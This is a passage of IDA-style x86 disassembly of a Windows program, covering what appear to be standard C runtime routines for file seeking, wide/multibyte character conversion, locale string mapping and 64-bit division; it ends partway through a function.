; Attributes: bp-based frame

sub_4188E0      proc near               ; CODE XREF: sub_4106FD+4C↑p
                                        ; sub_417C82+77↑p

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                push    ebp
                mov     ebp, esp
                sub     esp, 4
                push    ebx
                push    ecx
                mov     eax, [ebp+arg_4]
                add     eax, 0Ch
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_0]
                push    ebp
                push    [ebp+arg_8]
                mov     ecx, [ebp+arg_8]
                mov     ebp, [ebp+var_4]
                call    sub_41AB68
                push    esi
                push    edi
                call    eax
                pop     edi
                pop     esi
                mov     ebx, ebp
                pop     ebp
                mov     ecx, [ebp+arg_8]
                push    ebp
                mov     ebp, ebx
                cmp     ecx, 100h
                jnz     short loc_41891F
                mov     ecx, 2

loc_41891F:                             ; CODE XREF: sub_4188E0+38↑j
                push    ecx
                call    sub_41AB68
                pop     ebp
                pop     ecx
                pop     ebx
                leave
                retn    0Ch
sub_4188E0      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41892C(int, int, int, DWORD dwMoveMethod)
sub_41892C      proc near               ; CODE XREF: sub_413E86+15C↑p
                                        ; sub_413E86+300↑p ...

lDistanceToMove = dword ptr -8
DistanceToMoveHigh= dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
dwMoveMethod    = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    ecx
                mov     eax, [ebp+arg_4]
                push    esi
                mov     esi, [ebp+arg_0]
                mov     [ebp+lDistanceToMove], eax
                mov     eax, [ebp+arg_8]
                push    edi
                push    esi
                mov     [ebp+DistanceToMoveHigh], eax
                call    sub_416266
                or      edi, 0FFFFFFFFh
                pop     ecx
                cmp     eax, edi
                jnz     short loc_418963
                call    sub_41090E
                mov     dword ptr [eax], 9

loc_41895D:                             ; CODE XREF: sub_41892C+60↓j
                mov     eax, edi
                mov     edx, edi
                jmp     short loc_4189AD
; ---------------------------------------------------------------------------

loc_418963:                             ; CODE XREF: sub_41892C+24↑j
                push    [ebp+dwMoveMethod] ; dwMoveMethod
                lea     ecx, [ebp+DistanceToMoveHigh]
                push    ecx             ; lpDistanceToMoveHigh
                push    [ebp+lDistanceToMove] ; lDistanceToMove
                push    eax             ; hFile
                call    ds:SetFilePointer
                mov     [ebp+lDistanceToMove], eax
                cmp     eax, edi
                jnz     short loc_41898E
                call    ds:GetLastError
                test    eax, eax
                jz      short loc_41898E
                push    eax
                call    sub_410934
                pop     ecx
                jmp     short loc_41895D
; ---------------------------------------------------------------------------

loc_41898E:                             ; CODE XREF: sub_41892C+4D↑j
                                        ; sub_41892C+57↑j
                mov     eax, esi
                sar     eax, 5
                mov     eax, dword_42CA00[eax*4]
                and     esi, 1Fh
                shl     esi, 6
                lea     eax, [eax+esi+4]
                and     byte ptr [eax], 0FDh
                mov     eax, [ebp+lDistanceToMove]
                mov     edx, [ebp+DistanceToMoveHigh]

loc_4189AD:                             ; CODE XREF: sub_41892C+35↑j
                pop     edi
                pop     esi
                leave
                retn
sub_41892C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_4189B1(int, int, int, DWORD dwMoveMethod)
sub_4189B1      proc near               ; CODE XREF: sub_410957+11A↑p

var_24          = dword ptr -24h
var_20          = dword ptr -20h
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
dwMoveMethod    = dword ptr  14h

                push    14h
                push    offset stru_4231A8
                call    __SEH_prolog4
                or      esi, 0FFFFFFFFh
                mov     [ebp+var_24], esi
                mov     [ebp+var_20], esi
                mov     eax, [ebp+arg_0]
                cmp     eax, 0FFFFFFFEh
                jnz     short loc_4189EA
                call    sub_410921
                and     dword ptr [eax], 0
                call    sub_41090E
                mov     dword ptr [eax], 9

loc_4189E1:                             ; CODE XREF: sub_4189B1+66↓j
                mov     eax, esi
                mov     edx, esi
                jmp     loc_418ABA
; ---------------------------------------------------------------------------

loc_4189EA:                             ; CODE XREF: sub_4189B1+1B↑j
                xor     edi, edi
                cmp     eax, edi
                jl      short loc_4189F8
                cmp     eax, uNumber
                jb      short loc_418A19

loc_4189F8:                             ; CODE XREF: sub_4189B1+3D↑j
                call    sub_410921
                mov     [eax], edi
                call    sub_41090E
                mov     dword ptr [eax], 9
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                call    sub_40EC54
                add     esp, 14h
                jmp     short loc_4189E1
; ---------------------------------------------------------------------------

loc_418A19:                             ; CODE XREF: sub_4189B1+45↑j
                mov     ecx, eax
                sar     ecx, 5
                lea     ebx, dword_42CA00[ecx*4]
                mov     esi, eax
                and     esi, 1Fh
                shl     esi, 6
                mov     ecx, [ebx]
                movsx   ecx, byte ptr [ecx+esi+4]
                and     ecx, 1
                jnz     short loc_418A5F
                call    sub_410921
                mov     [eax], edi
                call    sub_41090E
                mov     dword ptr [eax], 9
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                call    sub_40EC54
                add     esp, 14h
                or      edx, 0FFFFFFFFh
                mov     eax, edx
                jmp     short loc_418ABA
; ---------------------------------------------------------------------------

loc_418A5F:                             ; CODE XREF: sub_4189B1+86↑j
                push    eax
                call    sub_4162DD
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], edi
                mov     eax, [ebx]
                test    byte ptr [eax+esi+4], 1
                jz      short loc_418A8E
                push    [ebp+dwMoveMethod] ; dwMoveMethod
                push    [ebp+arg_8]     ; int
                push    [ebp+arg_4]     ; int
                push    [ebp+arg_0]     ; int
                call    sub_41892C
                add     esp, 10h
                mov     [ebp+var_24], eax
                mov     [ebp+var_20], edx
                jmp     short loc_418AA8
; ---------------------------------------------------------------------------

loc_418A8E:                             ; CODE XREF: sub_4189B1+BF↑j
                call    sub_41090E
                mov     dword ptr [eax], 9
                call    sub_410921
                mov     [eax], edi
                or      [ebp+var_24], 0FFFFFFFFh
                or      [ebp+var_20], 0FFFFFFFFh

loc_418AA8:                             ; CODE XREF: sub_4189B1+DB↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_418AC0
; ---------------------------------------------------------------------------

loc_418AB4:                             ; CODE XREF: sub_4189B1+118↓j
                mov     eax, [ebp+var_24]
                mov     edx, [ebp+var_20]

loc_418ABA:                             ; CODE XREF: sub_4189B1+34↑j
                                        ; sub_4189B1+AC↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_418AC0:                             ; CODE XREF: sub_4189B1+FE↑j
                                        ; DATA XREF: .rdata:stru_4231A8↓o
                push    [ebp+arg_0]
                call    sub_41637D
                pop     ecx
                retn
sub_4189B1      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_418ACA      proc near               ; CODE XREF: sub_410957+9F↑p
                                        ; sub_413D5B+5D↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                inc     dword_42AE8C
                push    1000h
                call    sub_412BB3
                pop     ecx
                mov     ecx, [ebp+arg_0]
                mov     [ecx+8], eax
                test    eax, eax
                jz      short loc_418AF7
                or      dword ptr [ecx+0Ch], 8
                mov     dword ptr [ecx+18h], 1000h
                jmp     short loc_418B08
; ---------------------------------------------------------------------------

loc_418AF7:                             ; CODE XREF: sub_418ACA+1E↑j
                or      dword ptr [ecx+0Ch], 4
                lea     eax, [ecx+14h]
                mov     [ecx+8], eax
                mov     dword ptr [ecx+18h], 2

loc_418B08:                             ; CODE XREF: sub_418ACA+2B↑j
                mov     eax, [ecx+8]
                and     dword ptr [ecx+4], 0
                mov     [ecx], eax
                pop     ebp
                retn
sub_418ACA      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_418B13      proc near               ; CODE XREF: sub_410957+94↑p
                                        ; sub_4148B5+EA↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                cmp     eax, 0FFFFFFFEh
                jnz     short loc_418B2F
                call    sub_41090E
                mov     dword ptr [eax], 9
                xor     eax, eax
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_418B2F:                             ; CODE XREF: sub_418B13+B↑j
                push    esi
                xor     esi, esi
                cmp     eax, esi
                jl      short loc_418B3E
                cmp     eax, uNumber
                jb      short loc_418B5A

loc_418B3E:                             ; CODE XREF: sub_418B13+21↑j
                call    sub_41090E
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     dword ptr [eax], 9
                call    sub_40EC54
                add     esp, 14h
                xor     eax, eax
                jmp     short loc_418B74
; ---------------------------------------------------------------------------

loc_418B5A:                             ; CODE XREF: sub_418B13+29↑j
                mov     ecx, eax
                and     eax, 1Fh
                sar     ecx, 5
                mov     ecx, dword_42CA00[ecx*4]
                shl     eax, 6
                movsx   eax, byte ptr [ecx+eax+4]
                and     eax, 40h

loc_418B74:                             ; CODE XREF: sub_418B13+45↑j
                pop     esi
                pop     ebp
                retn
sub_418B13      endp


; =============== S U B R O U T I N E =======================================


sub_418B77      proc near               ; CODE XREF: sub_412E24:loc_412E4B↑p
                mov     edi, edi
                push    esi
                push    edi
                xor     edi, edi

loc_418B7D:                             ; CODE XREF: sub_418B77+1C↓j
                lea     esi, off_425DE0[edi]
                push    dword ptr [esi]
                call    sub_412101
                add     edi, 4
                pop     ecx
                mov     [esi], eax
                cmp     edi, 28h
                jb      short loc_418B7D
                pop     edi
                pop     esi
                retn
sub_418B77      endp


; =============== S U B R O U T I N E =======================================


sub_418B98      proc near               ; CODE XREF: sub_410B61+62F↑p
                mov     eax, ___security_cookie
                or      eax, 1
                xor     ecx, ecx
                cmp     dword_42B430, eax
                setz    cl
                mov     eax, ecx
                retn
sub_418B98      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_418BAE(int, LPSTR lpMultiByteStr, int cbMultiByte, WCHAR WideCharStr, int)
sub_418BAE      proc near               ; CODE XREF: sub_418D1A+13↓p

var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
lpMultiByteStr  = dword ptr  0Ch
cbMultiByte     = dword ptr  10h
WideCharStr     = word ptr  14h
arg_10          = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    ebx
                push    esi
                mov     esi, [ebp+lpMultiByteStr]
                xor     ebx, ebx
                push    edi
                mov     edi, [ebp+cbMultiByte]
                cmp     esi, ebx
                jnz     short loc_418BD9
                cmp     edi, ebx
                jbe     short loc_418BD9
                mov     eax, [ebp+arg_0]
                cmp     eax, ebx
                jz      short loc_418BD2
                mov     [eax], ebx

loc_418BD2:                             ; CODE XREF: sub_418BAE+20↑j
                                        ; sub_418BAE+F9↓j ...
                xor     eax, eax
                jmp     loc_418C5C
; ---------------------------------------------------------------------------

loc_418BD9:                             ; CODE XREF: sub_418BAE+15↑j
                                        ; sub_418BAE+19↑j
                mov     eax, [ebp+arg_0]
                cmp     eax, ebx
                jz      short loc_418BE3
                or      dword ptr [eax], 0FFFFFFFFh

loc_418BE3:                             ; CODE XREF: sub_418BAE+30↑j
                cmp     edi, 7FFFFFFFh
                jbe     short loc_418C06
                call    sub_41090E
                push    16h
                pop     esi
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     [eax], esi
                call    sub_40EC54
                add     esp, 14h

loc_418C02:                             ; CODE XREF: sub_418BAE+D5↓j
                                        ; sub_418BAE+E2↓j
                mov     eax, esi
                jmp     short loc_418C5C
; ---------------------------------------------------------------------------

loc_418C06:                             ; CODE XREF: sub_418BAE+3B↑j
                push    [ebp+arg_10]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                mov     eax, [ebp+var_10]
                cmp     [eax+14h], ebx
                jnz     loc_418CB9
                mov     ax, [ebp+WideCharStr]
                mov     ecx, 0FFh
                cmp     ax, cx
                jbe     short loc_418C61
                cmp     esi, ebx
                jz      short loc_418C3E
                cmp     edi, ebx
                jbe     short loc_418C3E
                push    edi
                push    ebx
                push    esi
                call    sub_413520
                add     esp, 0Ch

loc_418C3E:                             ; CODE XREF: sub_418BAE+7F↑j
                                        ; sub_418BAE+83↑j ...
                call    sub_41090E
                mov     dword ptr [eax], 2Ah
                call    sub_41090E
                mov     eax, [eax]
                cmp     [ebp+var_4], bl
                jz      short loc_418C5C
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh

loc_418C5C:                             ; CODE XREF: sub_418BAE+26↑j
                                        ; sub_418BAE+56↑j ...
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
; ---------------------------------------------------------------------------

loc_418C61:                             ; CODE XREF: sub_418BAE+7B↑j
                cmp     esi, ebx
                jz      short loc_418C97
                cmp     edi, ebx
                ja      short loc_418C95

loc_418C69:                             ; CODE XREF: sub_418BAE+14E↓j
                                        ; sub_418BAE+156↓j ...
                call    sub_41090E
                push    22h
                pop     esi
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     [eax], esi
                call    sub_40EC54
                add     esp, 14h
                cmp     [ebp+var_4], bl
                jz      loc_418C02
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh
                jmp     loc_418C02
; ---------------------------------------------------------------------------

loc_418C95:                             ; CODE XREF: sub_418BAE+B9↑j
                mov     [esi], al

loc_418C97:                             ; CODE XREF: sub_418BAE+B5↑j
                mov     eax, [ebp+arg_0]
                cmp     eax, ebx
                jz      short loc_418CA4
                mov     dword ptr [eax], 1

loc_418CA4:                             ; CODE XREF: sub_418BAE+EE↑j
                                        ; sub_418BAE+137↓j ...
                cmp     [ebp+var_4], bl
                jz      loc_418BD2
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh
                jmp     loc_418BD2
; ---------------------------------------------------------------------------

loc_418CB9:                             ; CODE XREF: sub_418BAE+69↑j
                lea     ecx, [ebp+lpMultiByteStr]
                push    ecx             ; lpUsedDefaultChar
                push    ebx             ; lpDefaultChar
                push    edi             ; cbMultiByte
                push    esi             ; lpMultiByteStr
                push    1               ; cchWideChar
                lea     ecx, [ebp+WideCharStr]
                push    ecx             ; lpWideCharStr
                push    ebx             ; dwFlags
                mov     [ebp+lpMultiByteStr], ebx
                push    dword ptr [eax+4] ; CodePage
                call    ds:WideCharToMultiByte
                cmp     eax, ebx
                jz      short loc_418CEB
                cmp     [ebp+lpMultiByteStr], ebx
                jnz     loc_418C3E
                mov     ecx, [ebp+arg_0]
                cmp     ecx, ebx
                jz      short loc_418CA4
                mov     [ecx], eax
                jmp     short loc_418CA4
; ---------------------------------------------------------------------------

loc_418CEB:                             ; CODE XREF: sub_418BAE+127↑j
                call    ds:GetLastError
                cmp     eax, 7Ah
                jnz     loc_418C3E
                cmp     esi, ebx
                jz      loc_418C69
                cmp     edi, ebx
                jbe     loc_418C69
                push    edi
                push    ebx
                push    esi
                call    sub_413520
                add     esp, 0Ch
                jmp     loc_418C69
sub_418BAE      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_418D1A(int, LPSTR lpMultiByteStr, int cbMultiByte, WCHAR WideCharStr)
sub_418D1A      proc near               ; CODE XREF: sub_410B61+534↑p
                                        ; sub_410B61+A9A↑p

arg_0           = dword ptr  8
lpMultiByteStr  = dword ptr  0Ch
cbMultiByte     = dword ptr  10h
WideCharStr     = word ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0               ; int
                push    dword ptr [ebp+WideCharStr] ; WideCharStr
                push    [ebp+cbMultiByte] ; cbMultiByte
                push    [ebp+lpMultiByteStr] ; lpMultiByteStr
                push    [ebp+arg_0]     ; int
                call    sub_418BAE
                add     esp, 14h
                pop     ebp
                retn
sub_418D1A      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_418D37      proc near               ; CODE XREF: sub_410B61+394↑p
                                        ; sub_412749+95↑p ...

var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = byte ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    [ebp+arg_4]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                movzx   eax, [ebp+arg_0]
                mov     ecx, [ebp+var_10]
                mov     ecx, [ecx+0C8h]
                movzx   eax, word ptr [ecx+eax*2]
                and     eax, 8000h
                cmp     [ebp+var_4], 0
                jz      short locret_418D6D
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh

locret_418D6D:                          ; CODE XREF: sub_418D37+2D↑j
                leave
                retn
sub_418D37      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_418D6F      proc near               ; CODE XREF: sub_4148B5+1B7↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0
                push    [ebp+arg_0]
                call    sub_418D37
                pop     ecx
                pop     ecx
                pop     ebp
                retn
sub_418D6F      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_418D90      proc near               ; CODE XREF: sub_410B61+904↑p

arg_0           = dword ptr  4
arg_4           = dword ptr  8
arg_8           = dword ptr  0Ch
arg_C           = dword ptr  10h

                push    esi
                mov     eax, [esp+4+arg_C]
                or      eax, eax
                jnz     short loc_418DC1
                mov     ecx, [esp+4+arg_8]
                mov     eax, [esp+4+arg_4]
                xor     edx, edx
                div     ecx
                mov     ebx, eax
                mov     eax, [esp+4+arg_0]
                div     ecx
                mov     esi, eax
                mov     eax, ebx
                mul     [esp+4+arg_8]
                mov     ecx, eax
                mov     eax, esi
                mul     [esp+4+arg_8]
                add     edx, ecx
                jmp     short loc_418E08
; ---------------------------------------------------------------------------

loc_418DC1:                             ; CODE XREF: sub_418D90+7↑j
                mov     ecx, eax
                mov     ebx, [esp+4+arg_8]
                mov     edx, [esp+4+arg_4]
                mov     eax, [esp+4+arg_0]

loc_418DCF:                             ; CODE XREF: sub_418D90+49↓j
                shr     ecx, 1
                rcr     ebx, 1
                shr     edx, 1
                rcr     eax, 1
                or      ecx, ecx
                jnz     short loc_418DCF
                div     ebx
                mov     esi, eax
                mul     [esp+4+arg_C]
                mov     ecx, eax
                mov     eax, [esp+4+arg_8]
                mul     esi
                add     edx, ecx
                jb      short loc_418DFD
                cmp     edx, [esp+4+arg_4]
                ja      short loc_418DFD
                jb      short loc_418E06
                cmp     eax, [esp+4+arg_0]
                jbe     short loc_418E06

loc_418DFD:                             ; CODE XREF: sub_418D90+5D↑j
                                        ; sub_418D90+63↑j
                dec     esi
                sub     eax, [esp+4+arg_8]
                sbb     edx, [esp+4+arg_C]

loc_418E06:                             ; CODE XREF: sub_418D90+65↑j
                                        ; sub_418D90+6B↑j
                xor     ebx, ebx

loc_418E08:                             ; CODE XREF: sub_418D90+2F↑j
                sub     eax, [esp+4+arg_0]
                sbb     edx, [esp+4+arg_4]
                neg     edx
                neg     eax
                sbb     edx, 0
                mov     ecx, edx
                mov     edx, ebx
                mov     ebx, ecx
                mov     ecx, eax
                mov     eax, esi
                pop     esi
                retn    10h
sub_418D90      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_418E25      proc near               ; CODE XREF: sub_418E45+223↓p
                                        ; sub_418E45+22C↓p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                test    eax, eax
                jz      short loc_418E43
                sub     eax, 8
                cmp     dword ptr [eax], 0DDDDh
                jnz     short loc_418E43
                push    eax             ; lpMem
                call    sub_40FD55
                pop     ecx

loc_418E43:                             ; CODE XREF: sub_418E25+A↑j
                                        ; sub_418E25+15↑j
                pop     ebp
                retn
sub_418E25      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_418E45(LCID Locale, DWORD dwMapFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpDestStr, int cchDest, UINT CodePage, int)
sub_418E45      proc near               ; CODE XREF: sub_4191EA+2E↓p

var_14          = dword ptr -14h
lpMem           = dword ptr -10h
lpWideCharStr   = dword ptr -0Ch
cchWideChar     = dword ptr -8
var_4           = dword ptr -4
Locale          = dword ptr  8
dwMapFlags      = dword ptr  0Ch
lpMultiByteStr  = dword ptr  10h
cbMultiByte     = dword ptr  14h
lpDestStr       = dword ptr  18h
cchDest         = dword ptr  1Ch
CodePage        = dword ptr  20h
arg_1C          = dword ptr  24h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 14h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                push    ebx
                push    esi
                xor     ebx, ebx
                push    edi
                mov     esi, ecx
                cmp     dword_42B434, ebx
                jnz     short loc_418E9E
                push    ebx             ; cchDest
                push    ebx             ; lpDestStr
                xor     edi, edi
                inc     edi
                push    edi             ; cchSrc
                push    offset SrcStr   ; lpSrcStr
                push    100h            ; dwMapFlags
                push    ebx             ; Locale
                call    ds:LCMapStringW
                test    eax, eax
                jz      short loc_418E89
                mov     dword_42B434, edi
                jmp     short loc_418E9E
; ---------------------------------------------------------------------------

loc_418E89:                             ; CODE XREF: sub_418E45+3A↑j
                call    ds:GetLastError
                cmp     eax, 78h
                jnz     short loc_418E9E
                mov     dword_42B434, 2

loc_418E9E:                             ; CODE XREF: sub_418E45+1F↑j
                                        ; sub_418E45+42↑j ...
                cmp     [ebp+cbMultiByte], ebx
                jle     short loc_418EC5
                mov     ecx, [ebp+cbMultiByte]
                mov     eax, [ebp+lpMultiByteStr]

loc_418EA9:                             ; CODE XREF: sub_418E45+6C↓j
                dec     ecx
                cmp     [eax], bl
                jz      short loc_418EB6
                inc     eax
                cmp     ecx, ebx
                jnz     short loc_418EA9
                or      ecx, 0FFFFFFFFh

loc_418EB6:                             ; CODE XREF: sub_418E45+67↑j
                mov     eax, [ebp+cbMultiByte]
                sub     eax, ecx
                dec     eax
                cmp     eax, [ebp+cbMultiByte]
                jge     short loc_418EC2
                inc     eax

loc_418EC2:                             ; CODE XREF: sub_418E45+7A↑j
                mov     [ebp+cbMultiByte], eax

loc_418EC5:                             ; CODE XREF: sub_418E45+5C↑j
                mov     eax, dword_42B434
                cmp     eax, 2
                jz      loc_41907F
                cmp     eax, ebx
                jz      loc_41907F
                cmp     eax, 1
                jnz     loc_4190B0
                mov     [ebp+cchWideChar], ebx
                cmp     [ebp+CodePage], ebx
                jnz     short loc_418EF4
                mov     eax, [esi]
                mov     eax, [eax+4]
                mov     [ebp+CodePage], eax

loc_418EF4:                             ; CODE XREF: sub_418E45+A5↑j
                mov     esi, ds:MultiByteToWideChar
                xor     eax, eax
                cmp     [ebp+arg_1C], ebx
                push    ebx             ; cchWideChar
                push    ebx             ; lpWideCharStr
                push    [ebp+cbMultiByte] ; cbMultiByte
                setnz   al
                push    [ebp+lpMultiByteStr] ; lpMultiByteStr
                lea     eax, ds:1[eax*8]
                push    eax             ; dwFlags
                push    [ebp+CodePage]  ; CodePage
                call    esi ; MultiByteToWideChar
                mov     edi, eax
                cmp     edi, ebx
                jz      loc_4190B0
                jle     short loc_418F66
                push    0FFFFFFE0h
                xor     edx, edx
                pop     eax
                div     edi
                cmp     eax, 2
                jb      short loc_418F66
                lea     eax, [edi+edi+8]
                cmp     eax, 400h
                ja      short loc_418F4D
                call    __alloca_probe_16
                mov     eax, esp
                cmp     eax, ebx
                jz      short loc_418F61
                mov     dword ptr [eax], 0CCCCh
                jmp     short loc_418F5E
; ---------------------------------------------------------------------------

loc_418F4D:                             ; CODE XREF: sub_418E45+F3↑j
                push    eax
                call    sub_40FE32
                pop     ecx
                cmp     eax, ebx
                jz      short loc_418F61
                mov     dword ptr [eax], 0DDDDh

loc_418F5E:                             ; CODE XREF: sub_418E45+106↑j
                add     eax, 8

loc_418F61:                             ; CODE XREF: sub_418E45+FE↑j
                                        ; sub_418E45+111↑j
                mov     [ebp+lpWideCharStr], eax
                jmp     short loc_418F69
; ---------------------------------------------------------------------------

loc_418F66:                             ; CODE XREF: sub_418E45+DC↑j
                                        ; sub_418E45+E8↑j
                mov     [ebp+lpWideCharStr], ebx

loc_418F69:                             ; CODE XREF: sub_418E45+11F↑j
                cmp     [ebp+lpWideCharStr], ebx
                jz      loc_4190B0
                push    edi             ; cchWideChar
                push    [ebp+lpWideCharStr] ; lpWideCharStr
                push    [ebp+cbMultiByte] ; cbMultiByte
                push    [ebp+lpMultiByteStr] ; lpMultiByteStr
                push    1               ; dwFlags
                push    [ebp+CodePage]  ; CodePage
                call    esi ; MultiByteToWideChar
                test    eax, eax
                jz      loc_41906E
                mov     esi, ds:LCMapStringW
                push    ebx             ; cchDest
                push    ebx             ; lpDestStr
                push    edi             ; cchSrc
                push    [ebp+lpWideCharStr] ; lpSrcStr
                push    [ebp+dwMapFlags] ; dwMapFlags
                push    [ebp+Locale]    ; Locale
                call    esi ; LCMapStringW
                mov     ecx, eax
                mov     [ebp+cchWideChar], ecx
                cmp     ecx, ebx
                jz      loc_41906E
                test    [ebp+dwMapFlags], 400h
                jz      short loc_418FDE
                cmp     [ebp+cchDest], ebx
                jz      loc_41906E
                cmp     ecx, [ebp+cchDest]
                jg      loc_41906E
                push    [ebp+cchDest]   ; cchDest
                push    [ebp+lpDestStr] ; lpDestStr
                push    edi             ; cchSrc
                push    [ebp+lpWideCharStr] ; lpSrcStr
                push    [ebp+dwMapFlags] ; dwMapFlags
                push    [ebp+Locale]    ; Locale
                call    esi ; LCMapStringW
                jmp     loc_41906E
; ---------------------------------------------------------------------------

loc_418FDE:                             ; CODE XREF: sub_418E45+16E↑j
                cmp     ecx, ebx
                jle     short loc_419027
                push    0FFFFFFE0h
                xor     edx, edx
                pop     eax
                div     ecx
                cmp     eax, 2
                jb      short loc_419027
                lea     eax, [ecx+ecx+8]
                cmp     eax, 400h
                ja      short loc_41900F
                call    __alloca_probe_16
                mov     esi, esp
                cmp     esi, ebx
                jz      short loc_41906E
                mov     dword ptr [esi], 0CCCCh
                add     esi, 8
                jmp     short loc_419029
; ---------------------------------------------------------------------------

loc_41900F:                             ; CODE XREF: sub_418E45+1B2↑j
                push    eax
                call    sub_40FE32
                pop     ecx
                cmp     eax, ebx
                jz      short loc_419023
                mov     dword ptr [eax], 0DDDDh
                add     eax, 8

loc_419023:                             ; CODE XREF: sub_418E45+1D3↑j
                mov     esi, eax
                jmp     short loc_419029
; ---------------------------------------------------------------------------

loc_419027:                             ; CODE XREF: sub_418E45+19B↑j
                                        ; sub_418E45+1A7↑j
                xor     esi, esi

loc_419029:                             ; CODE XREF: sub_418E45+1C8↑j
                                        ; sub_418E45+1E0↑j
                cmp     esi, ebx
                jz      short loc_41906E
                push    [ebp+cchWideChar] ; cchDest
                push    esi             ; lpDestStr
                push    edi             ; cchSrc
                push    [ebp+lpWideCharStr] ; lpSrcStr
                push    [ebp+dwMapFlags] ; dwMapFlags
                push    [ebp+Locale]    ; Locale
                call    ds:LCMapStringW
                test    eax, eax
                jz      short loc_419067
                push    ebx             ; lpUsedDefaultChar
                push    ebx             ; lpDefaultChar
                cmp     [ebp+cchDest], ebx
                jnz     short loc_419050
                push    ebx
                push    ebx
                jmp     short loc_419056
; ---------------------------------------------------------------------------

loc_419050:                             ; CODE XREF: sub_418E45+205↑j
                push    [ebp+cchDest]   ; cbMultiByte
                push    [ebp+lpDestStr] ; lpMultiByteStr

loc_419056:                             ; CODE XREF: sub_418E45+209↑j
                push    [ebp+cchWideChar] ; cchWideChar
                push    esi             ; lpWideCharStr
                push    ebx             ; dwFlags
                push    [ebp+CodePage]  ; CodePage
                call    ds:WideCharToMultiByte
                mov     [ebp+cchWideChar], eax

loc_419067:                             ; CODE XREF: sub_418E45+1FE↑j
                push    esi
                call    sub_418E25
                pop     ecx

loc_41906E:                             ; CODE XREF: sub_418E45+140↑j
                                        ; sub_418E45+161↑j ...
                push    [ebp+lpWideCharStr]
                call    sub_418E25
                mov     eax, [ebp+cchWideChar]
                pop     ecx
                jmp     loc_4191D8
; ---------------------------------------------------------------------------

loc_41907F:                             ; CODE XREF: sub_418E45+88↑j
                                        ; sub_418E45+90↑j
                mov     [ebp+lpWideCharStr], ebx
                mov     [ebp+lpMem], ebx
                cmp     [ebp+Locale], ebx
                jnz     short loc_419092
                mov     eax, [esi]
                mov     eax, [eax+14h]
                mov     [ebp+Locale], eax

loc_419092:                             ; CODE XREF: sub_418E45+243↑j
                cmp     [ebp+CodePage], ebx
                jnz     short loc_41909F
                mov     eax, [esi]
                mov     eax, [eax+4]
                mov     [ebp+CodePage], eax

loc_41909F:                             ; CODE XREF: sub_418E45+250↑j
                push    [ebp+Locale]    ; Locale
                call    sub_41CA3A
                pop     ecx
                mov     [ebp+var_14], eax
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_4190B7

loc_4190B0:                             ; CODE XREF: sub_418E45+99↑j
                                        ; sub_418E45+D6↑j ...
                xor     eax, eax
                jmp     loc_4191D8
; ---------------------------------------------------------------------------

loc_4190B7:                             ; CODE XREF: sub_418E45+269↑j
                cmp     eax, [ebp+CodePage]
                jz      loc_41919B
                push    ebx             ; int
                push    ebx             ; int
                lea     ecx, [ebp+cbMultiByte]
                push    ecx             ; int
                push    [ebp+lpMultiByteStr] ; int
                push    eax             ; UINT
                push    [ebp+CodePage]  ; CodePage
                call    sub_41CA83
                add     esp, 18h
                mov     [ebp+lpWideCharStr], eax
                cmp     eax, ebx
                jz      short loc_4190B0
